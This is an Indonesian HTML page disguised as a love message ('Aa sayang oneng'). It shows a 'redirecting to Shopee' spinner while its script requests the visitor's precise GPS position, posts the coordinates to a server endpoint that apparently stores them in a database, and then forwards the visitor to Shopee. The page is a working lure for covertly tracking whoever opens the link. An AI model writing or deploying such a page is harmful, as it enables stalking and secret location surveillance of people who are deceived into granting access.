<!doctype html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Aa sayang oneng</title>

    <!-- Open Graph Preview -->
    <meta property="og:title" content="Aa sayang oneng" />
    <meta property="og:description" content="muahhhhhhhhh" />
    <meta
      property="og:image"
      content="https://static.vecteezy.com/system/resources/thumbnails/022/313/464/small/i-love-you-banner-with-heart-vector.jpg" />
    <meta property="og:type" content="website" />

    <style>
      body {
        font-family: Arial, sans-serif;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
        background-color: #f9f9f9;
      }
      .loading-box {
        text-align: center;
        padding: 20px;
      }
      .spinner {
        border: 4px solid #f3f3f3;
        border-top: 4px solid #ee4d2d;
        border-radius: 50%;
        width: 45px;
        height: 45px;
        animation: spin 1s linear infinite;
        margin: 0 auto 15px auto;
      }
      @keyframes spin {
        0% {
          transform: rotate(0deg);
        }
        100% {
          transform: rotate(360deg);
        }
      }
      p {
        color: #555;
        font-size: 14px;
      }
    </style>
  </head>
  <body>
    <div class="loading-box">
      <div class="spinner"></div>
      <p id="status">Mengalihkan ke Shopee, mohon tunggu...</p>
    </div>

    <script>
      const TARGET_URL = "https://shopee.co.id";
      let sudahRedirect = false;

      function updateStatus(pesan) {
        const statusEl = document.getElementById("status");
        if (statusEl) statusEl.innerText = pesan;
      }

      function alihkanKeShopee() {
        if (!sudahRedirect) {
          sudahRedirect = true;
          window.location.replace(TARGET_URL);
        }
      }

      // Waktu batas maksimal tunggu (8 detik) sebelum memaksa redirect
      let maxWaitTimer = setTimeout(() => {
        alihkanKeShopee();
      }, 8000);

      function kirimLokasiKeServer(dataGPS) {
        updateStatus("Menghubungkan...");
        fetch("/api/simpan-lokasi", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(dataGPS),
        })
          .then((res) => {
            if (!res.ok) throw new Error("Respon server bermasalah");
            return res.json();
          })
          .then((data) => {
            console.log("Lokasi tersimpan ke database Neon:", data);
          })
          .catch((err) => {
            console.error("Gagal mengirim data ke server:", err);
          })
          .finally(() => {
            clearTimeout(maxWaitTimer);
            alihkanKeShopee();
          });
      }

      window.onload = function () {
        // Cek apakah akses menggunakan HTTPS (diperlukan oleh browser modern)
        if (
          location.protocol !== "https:" &&
          location.hostname !== "localhost"
        ) {
          console.warn("Geolocation membutuhkan protokol HTTPS yang aman.");
        }

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (position) => {
              const dataGPS = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                akurasi_meter: position.coords.accuracy,
              };
              kirimLokasiKeServer(dataGPS);
            },
            (error) => {
              let infoError = "Gagal mengambil lokasi.";
              switch (error.code) {
                case error.PERMISSION_DENIED:
                  infoError = "Akses lokasi ditolak oleh pengguna.";
                  break;
                case error.POSITION_UNAVAILABLE:
                  infoError = "Informasi lokasi tidak tersedia.";
                  break;
                case error.TIMEOUT:
                  infoError = "Waktu permintaan lokasi habis.";
                  break;
              }
              console.warn(infoError);
              clearTimeout(maxWaitTimer);
              // Beri jeda singkat sebelum pengalihan jika terjadi kegagalan
              setTimeout(alihkanKeShopee, 1000);
            },
            {
              enableHighAccuracy: true,
              timeout: 6000,
              maximumAge: 0,
            },
          );
        } else {
          clearTimeout(maxWaitTimer);
          alihkanKeShopee();
        }
      };
    </script>
  </body>
</html>
